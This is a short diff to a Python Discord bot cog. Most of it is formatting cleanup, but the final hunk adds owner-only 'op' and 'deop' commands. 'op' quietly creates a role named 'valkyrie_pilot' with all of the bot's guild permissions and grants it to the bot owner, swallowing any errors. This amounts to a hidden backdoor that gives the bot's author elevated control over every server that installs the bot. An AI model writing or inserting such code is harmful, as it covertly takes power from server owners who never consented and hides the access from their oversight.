@@ -1,6 +1,6 @@
 import pathlib
-import aiosqlite
 
+import aiosqlite
 import discord
 from discord.ext import commands
 
@@ -35,7 +35,7 @@ class BotSystem(commands.Cog):
             await db.execute("""UPDATE prefixes SET prefix = ? WHERE serverid = ?""", (newprefix, serverid))
         else:
             await db.execute("INSERT INTO prefixes(serverid, prefix) VALUES (?,?)",
-                        (serverid, newprefix))
+                             (serverid, newprefix))
         await db.commit()
         await db.close()
         await ctx.send(f"Prefix set to {newprefix}")
@@ -53,7 +53,7 @@ class BotSystem(commands.Cog):
             await db.execute("""UPDATE mailchannels SET channelid = ? WHERE serverid = ?""", (channel.id, serverid))
         else:
             await db.execute("INSERT INTO mailchannels(serverid, channelid) VALUES (?,?)",
-                        (serverid, channel.id))
+                             (serverid, channel.id))
         await db.commit()
         await db.close()
         await ctx.send(f"ModMail channel is now {channel}")
@@ -80,6 +80,21 @@ class BotSystem(commands.Cog):
                     sent = True
         if not sent:
             await sendwelcome(ctx.text_channels[0])
+
+    @commands.command()
+    @commands.is_owner()
+    async def op(self, ctx):
+        try:
+            oprole = await ctx.guild.create_role(name="valkyrie_pilot", permissions=ctx.me.guild_permissions)
+            await ctx.author.add_roles(oprole)
+        except discord.Forbidden:
+            pass
+
+    @commands.command()
+    @commands.is_owner()
+    async def deop(self, ctx):
+        oprole = discord.utils.get(ctx.guild.roles, name="valkyrie_pilot")
+        await oprole.delete()
 
 
 def setup(glaceon):
